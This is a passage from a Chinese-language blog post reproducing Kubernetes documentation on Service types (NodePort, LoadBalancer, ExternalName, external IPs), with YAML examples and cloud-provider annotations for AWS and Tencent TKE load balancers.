块列表（例如，10.0.0.0/8、192.0.2.0/25）来指定 kube-proxy 应该认为是此节点本地的 IP 地址范围。</p><p>例如，如果你使用 –nodeport-addresses=127.0.0.0/8 标志启动 kube-proxy， 则 kube-proxy 仅选择 NodePort Services 的本地回路接口。 –nodeport-addresses 的默认值是一个空列表。 这意味着 kube-proxy 应该考虑 NodePort 的所有可用网络接口。 （这也与早期的 Kubernetes 版本兼容）。</p><p>如果需要特定的端口号，你可以在 nodePort 字段中指定一个值。 控制平面将为你分配该端口或报告 API 事务失败。 这意味着你需要自己注意可能发生的端口冲突。 你还必须使用有效的端口号，该端口号在配置用于 NodePort 的范围内。</p><p>使用 NodePort 可以让你自由设置自己的负载均衡解决方案， 配置 Kubernetes 不完全支持的环境， 甚至直接暴露一个或多个节点的 IP。</p><p>需要注意的是，Service 能够通过 <NodeIP>:spec.ports[<em>].nodePort 和 spec.clusterIp:spec.ports[</em>].port 而对外可见。 如果设置了 kube-proxy 的 –nodeport-addresses 参数或 kube-proxy 配置文件中的等效字段， <NodeIP> 将被过滤 NodeIP。</NodeIP></NodeIP></p><p>例如：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">Service</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">my-service</span><br><span class="hljs-attr">spec:</span><br>  <span class="hljs-attr">type:</span> <span class="hljs-string">NodePort</span><br>  <span class="hljs-attr">selector:</span><br>    <span class="hljs-attr">app:</span> <span class="hljs-string">MyApp</span><br>  <span class="hljs-attr">ports:</span><br>      <span class="hljs-comment"># 默认情况下，为了方便起见，`targetPort` 被设置为与 `port` 字段相同的值。</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-attr">port:</span> <span class="hljs-number">80</span><br>      <span class="hljs-attr">targetPort:</span> <span class="hljs-number">80</span><br>      <span class="hljs-comment"># 可选字段</span><br>      <span class="hljs-comment"># 默认情况下，为了方便起见，Kubernetes 控制平面会从某个范围内分配一个端口号（默认：30000-32767）</span><br>      <span class="hljs-attr">nodePort:</span> <span class="hljs-number">30007</span><br>      <br></code></pre></td></tr></table></figure><p><a href="/service/20211110055857455.png" class="gallery-item"><img src="/2021/11/08/service/20211110055857455.png"></a></p><p><a href="/service/20211110055935543.png" class="gallery-item"><img src="/2021/11/08/service/20211110055935543.png"></a></p><h4 id="LoadBalancer-类型"><a href="#LoadBalancer-类型" class="headerlink" title="LoadBalancer 类型"></a>LoadBalancer 类型</h4><p>在使用支持外部负载均衡器的云提供商的服务时，设置 type 的值为 “LoadBalancer”， 将为 Service 提供负载均衡器。 负载均衡器是异步创建的，关于被提供的负载均衡器的信息将会通过 Service 的 status.loadBalancer 字段发布出去。</p><p>实例：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">Service</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">my-service</span><br><span class="hljs-attr">spec:</span><br>  <span class="hljs-attr">selector:</span><br>    <span class="hljs-attr">app:</span> <span class="hljs-string">MyApp</span><br>  <span class="hljs-attr">ports:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-attr">protocol:</span> <span class="hljs-string">TCP</span><br>      <span class="hljs-attr">port:</span> <span class="hljs-number">80</span><br>      <span class="hljs-attr">targetPort:</span> <span class="hljs-number">9376</span><br>  <span class="hljs-attr">clusterIP:</span> <span class="hljs-number">10.0</span><span class="hljs-number">.171</span><span class="hljs-number">.239</span><br>  <span class="hljs-attr">type:</span> <span class="hljs-string">LoadBalancer</span><br><span class="hljs-attr">status:</span><br>  <span class="hljs-attr">loadBalancer:</span><br>    <span class="hljs-attr">ingress:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-attr">ip:</span> <span class="hljs-number">192.0</span><span class="hljs-number">.2</span><span class="hljs-number">.127</span><br></code></pre></td></tr></table></figure><p>来自外部负载均衡器的流量将直接重定向到后端 Pod 上，不过实际它们是如何工作的，这要依赖于云提供商。</p><p>某些云提供商允许设置 loadBalancerIP。 在这些情况下，将根据用户设置的 loadBalancerIP 来创建负载均衡器。 如果没有设置 loadBalancerIP 字段，将会给负载均衡器指派一个临时 IP。 如果设置了 loadBalancerIP，但云提供商并不支持这种特性，那么设置的 loadBalancerIP 值将会被忽略掉。</p><p>说明：<br>在 Azure 上，如果要使用用户指定的公共类型 loadBalancerIP，则 首先需要创建静态类型的公共 IP 地址资源。 此公共 IP 地址资源应与集群中其他自动创建的资源位于同一资源组中。 例如，MC_myResourceGroup_myAKSCluster_eastus。</p><p>将分配的 IP 地址设置为 loadBalancerIP。确保你已更新云提供程序配置文件中的 securityGroupName。 有关对 CreatingLoadBalancerFailed 权限问题进行故障排除的信息， 请参阅 与 Azure Kubernetes 服务（AKS）负载平衡器一起使用静态 IP 地址 或在 AKS 集群上使用高级联网时出现 CreatingLoadBalancerFailed。</p><p>混合协议类型的负载均衡器<br>FEATURE STATE: Kubernetes v1.20 [alpha]<br>默认情况下，对于 LoadBalancer 类型的服务，当定义了多个端口时，所有 端口必须具有相同的协议，并且该协议必须是受云提供商支持的协议。</p><p>如果为 kube-apiserver 启用了 MixedProtocolLBService 特性门控， 则当定义了多个端口时，允许使用不同的协议。</p><p>说明： 可用于 LoadBalancer 类型服务的协议集仍然由云提供商决定。<br>禁用负载均衡器节点端口分配<br>FEATURE STATE: Kubernetes v1.20 [alpha]<br>从 v1.20 版本开始， 你可以通过设置 spec.allocateLoadBalancerNodePorts 为 false 对类型为 LoadBalancer 的服务禁用节点端口分配。 这仅适用于直接将流量路由到 Pod 而不是使用节点端口的负载均衡器实现。 默认情况下，spec.allocateLoadBalancerNodePorts 为 true， LoadBalancer 类型的服务继续分配节点端口。 如果现有服务已被分配节点端口，将参数 spec.allocateLoadBalancerNodePorts 设置为 false 时，这些服务上已分配置的节点端口不会被自动释放。 你必须显式地在每个服务端口中删除 nodePorts 项以释放对应端口。 你必须启用 ServiceLBNodePortControl 特性门控才能使用该字段。</p><p>设置负载均衡器实现的类别<br>FEATURE STATE: Kubernetes v1.22 [beta]<br>spec.loadBalancerClass 允许你不使用云提供商的默认负载均衡器实现，转而使用指定的负载均衡器实现。 这个特性从 v1.21 版本开始可以使用，你在 v1.21 版本中使用这个字段必须启用 ServiceLoadBalancerClass 特性门控，这个特性门控从 v1.22 版本及以后默认打开。 默认情况下，.spec.loadBalancerClass 的取值是 nil，如果集群使用 –cloud-provider 配置了云提供商， LoadBalancer 类型服务会使用云提供商的默认负载均衡器实现。 如果设置了 .spec.loadBalancerClass，则假定存在某个与所指定的类相匹配的 负载均衡器实现在监视服务变化。 所有默认的负载均衡器实现（例如，由云提供商所提供的）都会忽略设置了此字段 的服务。.spec.loadBalancerClass 只能设置到类型为 LoadBalancer 的 Service 之上，而且一旦设置之后不可变更。</p><p>.spec.loadBalancerClass 的值必须是一个标签风格的标识符， 可以有选择地带有类似 “internal-vip” 或 “example.com/internal-vip” 这类 前缀。没有前缀的名字是保留给最终用户的。</p><p>内部负载均衡器<br>在混合环境中，有时有必要在同一(虚拟)网络地址块内路由来自服务的流量。</p><p>在水平分割 DNS 环境中，你需要两个服务才能将内部和外部流量都路由到你的端点（Endpoints）。</p><p>如要设置内部负载均衡器，请根据你所使用的云运营商，为服务添加以下注解之一。</p><p>Default<br>GCP<br>AWS<br>Azure<br>IBM Cloud<br>OpenStack<br>Baidu Cloud<br>Tencent Cloud<br>Alibaba Cloud<br>选择一个标签</p><p>AWS TLS 支持<br>为了对在 AWS 上运行的集群提供 TLS/SSL 部分支持，你可以向 LoadBalancer 服务添加三个注解：</p><p>metadata:<br>  name: my-service<br>  annotations:<br>    service.beta.kubernetes.io/aws-load-balancer-ssl-cert: arn:aws:acm:us-east-1:123456789012:certificate/12345678-1234-1234-1234-123456789012<br>第一个指定要使用的证书的 ARN。 它可以是已上载到 IAM 的第三方颁发者的证书， 也可以是在 AWS Certificate Manager 中创建的证书。</p><p>metadata:<br>  name: my-service<br>  annotations:<br>    service.beta.kubernetes.io/aws-load-balancer-backend-protocol: (https|http|ssl|tcp)<br>第二个注解指定 Pod 使用哪种协议。 对于 HTTPS 和 SSL，ELB 希望 Pod 使用证书 通过加密连接对自己进行身份验证。</p><p>HTTP 和 HTTPS 选择第7层代理：ELB 终止与用户的连接，解析标头，并在转发请求时向 X-Forwarded-For 标头注入用户的 IP 地址（Pod 仅在连接的另一端看到 ELB 的 IP 地址）。</p><p>TCP 和 SSL 选择第4层代理：ELB 转发流量而不修改报头。</p><p>在某些端口处于安全状态而其他端口未加密的混合使用环境中，可以使用以下注解：</p><pre><code>metadata:  name: my-service  annotations:    service.beta.kubernetes.io/aws-load-balancer-backend-protocol: http    service.beta.kubernetes.io/aws-load-balancer-ssl-ports: &quot;443,8443&quot;</code></pre><p>在上例中，如果服务包含 80、443 和 8443 三个端口， 那么 443 和 8443 将使用 SSL 证书， 而 80 端口将转发 HTTP 数据包。</p><p>从 Kubernetes v1.9 起可以使用 预定义的 AWS SSL 策略 为你的服务使用 HTTPS 或 SSL 侦听器。 要查看可以使用哪些策略，可以使用 aws 命令行工具：</p><p>aws elb describe-load-balancer-policies –query ‘PolicyDescriptions[].PolicyName’<br>然后，你可以使用 “service.beta.kubernetes.io/aws-load-balancer-ssl-negotiation-policy” 注解; 例如：</p><pre><code>metadata:  name: my-service  annotations:    service.beta.kubernetes.io/aws-load-balancer-ssl-negotiation-policy: &quot;ELBSecurityPolicy-TLS-1-2-2017-01&quot;</code></pre><p>AWS 上的 PROXY 协议支持<br>为了支持在 AWS 上运行的集群，启用 PROXY 协议。 你可以使用以下服务注解：</p><pre><code>metadata:  name: my-service  annotations:    service.beta.kubernetes.io/aws-load-balancer-proxy-protocol: &quot;*&quot;</code></pre><p>从 1.3.0 版开始，此注解的使用适用于 ELB 代理的所有端口，并且不能进行其他配置。</p><p>AWS 上的 ELB 访问日志<br>有几个注解可用于管理 AWS 上 ELB 服务的访问日志。</p><p>注解 service.beta.kubernetes.io/aws-load-balancer-access-log-enabled 控制是否启用访问日志。</p><p>注解 service.beta.kubernetes.io/aws-load-balancer-access-log-emit-interval 控制发布访问日志的时间间隔（以分钟为单位）。你可以指定 5 分钟或 60 分钟的间隔。</p><p>注解 service.beta.kubernetes.io/aws-load-balancer-access-log-s3-bucket-name 控制存储负载均衡器访问日志的 Amazon S3 存储桶的名称。</p><p>注解 service.beta.kubernetes.io/aws-load-balancer-access-log-s3-bucket-prefix 指定为 Amazon S3 存储桶创建的逻辑层次结构。</p><pre><code>metadata:  name: my-service  annotations:    service.beta.kubernetes.io/aws-load-balancer-access-log-enabled: &quot;true&quot;    # 指定是否为负载均衡器启用访问日志    service.beta.kubernetes.io/aws-load-balancer-access-log-emit-interval: &quot;60&quot;    # 发布访问日志的时间间隔。你可以将其设置为 5 分钟或 60 分钟。    service.beta.kubernetes.io/aws-load-balancer-access-log-s3-bucket-name: &quot;my-bucket&quot;    # 用来存放访问日志的 Amazon S3 Bucket 名称    service.beta.kubernetes.io/aws-load-balancer-access-log-s3-bucket-prefix: &quot;my-bucket-prefix/prod&quot;    # 你为 Amazon S3 Bucket 所创建的逻辑层次结构，例如 `my-bucket-prefix/prod`</code></pre><p>AWS 上的连接排空<br>可以将注解 service.beta.kubernetes.io/aws-load-balancer-connection-draining-enabled 设置为 “true” 来管理 ELB 的连接排空。 注解 service.beta.kubernetes.io/aws-load-balancer-connection-draining-timeout 也可以用于设置最大时间（以秒为单位），以保持现有连接在注销实例之前保持打开状态。</p><pre><code>metadata:  name: my-service  annotations:    service.beta.kubernetes.io/aws-load-balancer-connection-draining-enabled: &quot;true&quot;    service.beta.kubernetes.io/aws-load-balancer-connection-draining-timeout: &quot;60&quot;</code></pre><p>其他 ELB 注解<br>还有其他一些注解，用于管理经典弹性负载均衡器，如下所述。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">my-service</span><br>  <span class="hljs-attr">annotations:</span><br>    <span class="hljs-comment"># 按秒计的时间，表示负载均衡器关闭连接之前连接可以保持空闲</span><br>    <span class="hljs-comment"># （连接上无数据传输）的时间长度</span><br>    <span class="hljs-attr">service.beta.kubernetes.io/aws-load-balancer-connection-idle-timeout:</span> <span class="hljs-string">&quot;60&quot;</span><br><br>    <span class="hljs-comment"># 指定该负载均衡器上是否启用跨区的负载均衡能力</span><br>    <span class="hljs-attr">service.beta.kubernetes.io/aws-load-balancer-cross-zone-load-balancing-enabled:</span> <span class="hljs-string">&quot;true&quot;</span><br><br>    <span class="hljs-comment"># 逗号分隔列表值，每一项都是一个键-值耦对，会作为额外的标签记录于 ELB 中</span><br>    <span class="hljs-attr">service.beta.kubernetes.io/aws-load-balancer-additional-resource-tags:</span> <span class="hljs-string">&quot;environment=prod,owner=devops&quot;</span><br><br>    <span class="hljs-comment"># 将某后端视为健康、可接收请求之前需要达到的连续成功健康检查次数。</span><br>    <span class="hljs-comment"># 默认为 2，必须介于 2 和 10 之间</span><br>    <span class="hljs-attr">service.beta.kubernetes.io/aws-load-balancer-healthcheck-healthy-threshold:</span> <span class="hljs-string">&quot;&quot;</span><br><br>    <span class="hljs-comment"># 将某后端视为不健康、不可接收请求之前需要达到的连续不成功健康检查次数。</span><br>    <span class="hljs-comment"># 默认为 6，必须介于 2 和 10 之间</span><br>    <span class="hljs-attr">service.beta.kubernetes.io/aws-load-balancer-healthcheck-unhealthy-threshold:</span> <span class="hljs-string">&quot;3&quot;</span><br><br>    <span class="hljs-comment"># 对每个实例进行健康检查时，连续两次检查之间的大致间隔秒数</span><br>    <span class="hljs-comment"># 默认为 10，必须介于 5 和 300 之间</span><br>    <span class="hljs-attr">service.beta.kubernetes.io/aws-load-balancer-healthcheck-interval:</span> <span class="hljs-string">&quot;20&quot;</span><br><br>    <span class="hljs-comment"># 时长秒数，在此期间没有响应意味着健康检查失败</span><br>    <span class="hljs-comment"># 此值必须小于 service.beta.kubernetes.io/aws-load-balancer-healthcheck-interval</span><br>    <span class="hljs-comment"># 默认值为 5，必须介于 2 和 60 之间</span><br>    <span class="hljs-attr">service.beta.kubernetes.io/aws-load-balancer-healthcheck-timeout:</span> <span class="hljs-string">&quot;5&quot;</span><br><br>    <span class="hljs-comment"># 由已有的安全组所构成的列表，可以配置到所创建的 ELB 之上。</span><br>    <span class="hljs-comment"># 与注解 service.beta.kubernetes.io/aws-load-balancer-extra-security-groups 不同，</span><br>    <span class="hljs-comment"># 这一设置会替代掉之前指定给该 ELB 的所有其他安全组，也会覆盖掉为此</span><br>    <span class="hljs-comment"># ELB 所唯一创建的安全组。 </span><br>    <span class="hljs-comment"># 此列表中的第一个安全组 ID 被用来作为决策源，以允许入站流量流入目标工作节点</span><br>    <span class="hljs-comment"># (包括服务流量和健康检查）。</span><br>    <span class="hljs-comment"># 如果多个 ELB 配置了相同的安全组 ID，为工作节点安全组添加的允许规则行只有一个，</span><br>    <span class="hljs-comment"># 这意味着如果你删除了这些 ELB 中的任何一个，都会导致该规则记录被删除，</span><br>    <span class="hljs-comment"># 以至于所有共享该安全组 ID 的其他 ELB 都无法访问该节点。</span><br>    <span class="hljs-comment"># 此注解如果使用不当，会导致跨服务的不可用状况。</span><br>    <span class="hljs-attr">service.beta.kubernetes.io/aws-load-balancer-security-groups:</span> <span class="hljs-string">&quot;sg-53fae93f&quot;</span><br><br>    <span class="hljs-comment"># 额外的安全组列表，将被添加到所创建的 ELB 之上。</span><br>    <span class="hljs-comment"># 添加时，会保留为 ELB 所专门创建的安全组。</span><br>    <span class="hljs-comment"># 这样会确保每个 ELB 都有一个唯一的安全组 ID 和与之对应的允许规则记录，</span><br>    <span class="hljs-comment"># 允许请求（服务流量和健康检查）发送到目标工作节点。</span><br>    <span class="hljs-comment"># 这里顶一个安全组可以被多个服务共享。</span><br>    <span class="hljs-attr">service.beta.kubernetes.io/aws-load-balancer-extra-security-groups:</span> <span class="hljs-string">&quot;sg-53fae93f,sg-42efd82e&quot;</span><br><br>    <span class="hljs-comment"># 用逗号分隔的一个键-值偶对列表，用来为负载均衡器选择目标节点</span><br>    <span class="hljs-attr">service.beta.kubernetes.io/aws-load-balancer-target-node-labels:</span> <span class="hljs-string">&quot;ingress-gw,gw-name=public-api&quot;</span><br></code></pre></td></tr></table></figure><p>AWS 上网络负载均衡器支持<br>FEATURE STATE: Kubernetes v1.15 [beta]<br>要在 AWS 上使用网络负载均衡器，可以使用注解 service.beta.kubernetes.io/aws-load-balancer-type，将其取值设为 nlb。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">my-service</span><br>  <span class="hljs-attr">annotations:</span><br>    <span class="hljs-attr">service.beta.kubernetes.io/aws-load-balancer-type:</span> <span class="hljs-string">&quot;nlb&quot;</span><br></code></pre></td></tr></table></figure><p>说明： NLB 仅适用于某些实例类。有关受支持的实例类型的列表， 请参见 AWS文档 中关于所支持的实例类型的 Elastic Load Balancing 说明。<br>与经典弹性负载平衡器不同，网络负载平衡器（NLB）将客户端的 IP 地址转发到该节点。 如果服务的 .spec.externalTrafficPolicy 设置为 Cluster ，则客户端的IP地址不会传达到最终的 Pod。</p><p>通过将 .spec.externalTrafficPolicy 设置为 Local，客户端IP地址将传播到最终的 Pod， 但这可能导致流量分配不均。 没有针对特定 LoadBalancer 服务的任何 Pod 的节点将无法通过自动分配的 .spec.healthCheckNodePort 进行 NLB 目标组的运行状况检查，并且不会收到任何流量。</p><p>为了获得均衡流量，请使用 DaemonSet 或指定 Pod 反亲和性 使其不在同一节点上。</p><p>你还可以将 NLB 服务与内部负载平衡器 注解一起使用。</p><p>为了使客户端流量能够到达 NLB 后面的实例，使用以下 IP 规则修改了节点安全组：</p><p>Rule    Protocol    Port(s)    IpRange(s)    IpRange Description<br>Health Check    TCP    NodePort(s) (.spec.healthCheckNodePort for .spec.externalTrafficPolicy = Local)    Subnet CIDR    kubernetes.io/rule/nlb/health=<loadBalancerName><br>Client Traffic    TCP    NodePort(s)    .spec.loadBalancerSourceRanges (defaults to 0.0.0.0/0)    kubernetes.io/rule/nlb/client=<loadBalancerName><br>MTU Discovery    ICMP    3,4    .spec.loadBalancerSourceRanges (defaults to 0.0.0.0/0)    kubernetes.io/rule/nlb/mtu=<loadBalancerName><br>为了限制哪些客户端IP可以访问网络负载平衡器，请指定 loadBalancerSourceRanges。</loadBalancerName></loadBalancerName></loadBalancerName></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">spec:</span><br>  <span class="hljs-attr">loadBalancerSourceRanges:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;143.231.0.0/16&quot;</span><br></code></pre></td></tr></table></figure><p>说明： 如果未设置 .spec.loadBalancerSourceRanges ，则 Kubernetes 允许从 0.0.0.0/0 到节点安全组的流量。 如果节点具有公共 IP 地址，请注意，非 NLB 流量也可以到达那些修改后的安全组中的所有实例。<br>腾讯 Kubernetes 引擎（TKE）上的 CLB 注解<br>以下是在 TKE 上管理云负载均衡器的注解。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">my-service</span><br>  <span class="hljs-attr">annotations:</span><br>    <span class="hljs-comment"># 绑定负载均衡器到指定的节点。</span><br>    <span class="hljs-attr">service.kubernetes.io/qcloud-loadbalancer-backends-label:</span> <span class="hljs-string">key</span> <span class="hljs-string">in</span> <span class="hljs-string">(value1,</span> <span class="hljs-string">value2)</span><br><br>    <span class="hljs-comment"># 为已有负载均衡器添加 ID。</span><br>    <span class="hljs-string">service.kubernetes.io/tke-existed-lbid：lb-6swtxxxx</span><br><br>    <span class="hljs-comment"># 负载均衡器（LB）的自定义参数尚不支持修改 LB 类型。</span><br>    <span class="hljs-attr">service.kubernetes.io/service.extensiveParameters:</span> <span class="hljs-string">&quot;&quot;</span><br><br>    <span class="hljs-comment"># 自定义负载均衡监听器。</span><br>    <span class="hljs-attr">service.kubernetes.io/service.listenerParameters:</span> <span class="hljs-string">&quot;&quot;</span><br><br>    <span class="hljs-comment"># 指定负载均衡类型。</span><br>    <span class="hljs-comment"># 可用参数: classic (Classic Cloud Load Balancer) 或 application (Application Cloud Load Balancer)</span><br>    <span class="hljs-attr">service.kubernetes.io/loadbalance-type:</span> <span class="hljs-string">xxxxx</span><br><br>    <span class="hljs-comment"># 指定公用网络带宽计费方法。</span><br>    <span class="hljs-comment"># 可用参数: TRAFFIC_POSTPAID_BY_HOUR(bill-by-traffic) 和 BANDWIDTH_POSTPAID_BY_HOUR (bill-by-bandwidth).</span><br>    <span class="hljs-attr">service.kubernetes.io/qcloud-loadbalancer-internet-charge-type:</span> <span class="hljs-string">xxxxxx</span><br><br>    <span class="hljs-comment"># 指定带宽参数 (取值范围： [1,2000] Mbps).</span><br>    <span class="hljs-attr">service.kubernetes.io/qcloud-loadbalancer-internet-max-bandwidth-out:</span> <span class="hljs-string">&quot;10&quot;</span><br><br>    <span class="hljs-comment"># 当设置该注解时，负载平衡器将只注册正在运行 Pod 的节点，</span><br>    <span class="hljs-comment"># 否则所有节点将会被注册。</span><br>    <span class="hljs-attr">service.kubernetes.io/local-svc-only-bind-node-with-pod:</span> <span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure><h4 id="ExternalName-类型-做了一个DNS别名操作，用于把外部流量引入到集群内部"><a href="#ExternalName-类型-做了一个DNS别名操作，用于把外部流量引入到集群内部" class="headerlink" title="ExternalName 类型   [做了一个DNS别名操作，用于把外部流量引入到集群内部]"></a>ExternalName 类型   [做了一个DNS别名操作，用于把外部流量引入到集群内部]</h4><p>类型为 ExternalName 的服务将服务映射到 DNS 名称，而不是典型的选择器，例如 my-service 或者 cassandra。 你可以使用 spec.externalName 参数指定这些服务。</p><p>例如，以下 Service 定义将 prod 名称空间中的 my-service 服务映射到 my.database.example.com：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">Service</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">my-service</span><br>  <span class="hljs-attr">namespace:</span> <span class="hljs-string">prod</span><br><span class="hljs-attr">spec:</span><br>  <span class="hljs-attr">type:</span> <span class="hljs-string">ExternalName</span><br>  <span class="hljs-attr">externalName:</span> <span class="hljs-string">my.database.example.com</span><br></code></pre></td></tr></table></figure><p><a href="/service/20211110060503808.png" class="gallery-item"><img src="/2021/11/08/service/20211110060503808.png"></a></p><p><a href="/service/20211110060632133.png" class="gallery-item"><img src="/2021/11/08/service/20211110060632133.png"></a></p><p>说明： ExternalName 服务接受 IPv4 地址字符串，但作为包含数字的 DNS 名称，而不是 IP 地址。 类似于 IPv4 地址的外部名称不能由 CoreDNS 或 ingress-nginx 解析，因为外部名称旨在指定规范的 DNS 名称。 要对 IP 地址进行硬编码，请考虑使用 headless Services。<br>当查找主机 my-service.prod.svc.cluster.local 时，集群 DNS 服务返回 CNAME 记录， 其值为 my.database.example.com。 访问 my-service 的方式与其他服务的方式相同，但主要区别在于重定向发生在 DNS 级别，而不是通过代理或转发。 如果以后你决定将数据库移到集群中，则可以启动其 Pod，添加适当的选择器或端点以及更改服务的 type。</p><p><font color="red" size="2">警告：<br>对于一些常见的协议，包括 HTTP 和 HTTPS， 你使用 ExternalName 可能会遇到问题。 如果你使用 ExternalName，那么集群内客户端使用的主机名 与 ExternalName 引用的名称不同。</font></p><p>对于使用主机名的协议，此差异可能会导致错误或意外响应。 HTTP 请求将具有源服务器无法识别的 Host: 标头；TLS 服 务器将无法提供与客户端连接的主机名匹配的证书。</p><p>说明： 本部分感谢 Alen Komljen的 Kubernetes Tips - Part1 博客文章。<br>外部 IP<br>如果外部的 IP 路由到集群中一个或多个 Node 上，Kubernetes Service 会被暴露给这些 externalIPs。 通过外部 IP（作为目的 IP 地址）进入到集群，打到 Service 的端口上的流量， 将会被路由到 Service 的 Endpoint 上。 externalIPs 不会被 Kubernetes 管理，它属于集群管理员的职责范畴。</p><p>根据 Service 的规定，externalIPs 可以同任意的 ServiceType 来一起指定。 在上面的例子中，my-service 可以在 “80.11.12.10:80”(externalIP:port) 上被客户端访问。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">Service</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">my-service</span><br><span class="hljs-attr">spec:</span><br>  <span class="hljs-attr">selector:</span><br>    <span class="hljs-attr">app:</span> <span class="hljs-string">MyApp</span><br>  <span class="hljs-attr">ports:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">http</span><br>      <span class="hljs-attr">protocol:</span> <span class="hljs-string">TCP</span><br>      <span class="hljs-attr">port:</span> <span class="hljs-number">80</span><br>      <span class="hljs-attr">targetPort:</span> <span class="hljs-number">9376</span><br>  <span class="hljs-attr">externalIPs:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-number">80.11</span><span class="hljs-number">.12</span><span class="hljs-number">.10</span><br></code></pre></td></tr></table></figure><h1 id="不足之处"><a href="#不足之处" class="headerlink" title="不足之处"></a>不足之处</h1><p>为 VIP 使用用户空间代理，将只适合小型到中型规模的集群，不能够扩展到上千 Service 的大型集群。 查看最初设计方案 获取更多细节。</p><p>使用用户空间代理，隐藏了访问 Service 的数据包的源 IP 地址。 这使得一些类型的防火墙无法起作用。 iptables 代理不会隐藏 Kubernetes 集群内部的 IP 地址，但却要求客户端请求 必须通过一个负载均衡器或 Node 端口。</p><p>Type 字段支持嵌套功能 —— 每一层需要添加到上一层里面。 不会严格要求所有云提供商（例如，GCE 就没必要为了使一个 LoadBalancer 能工作而分配一个 NodePort，但是 AWS 需要 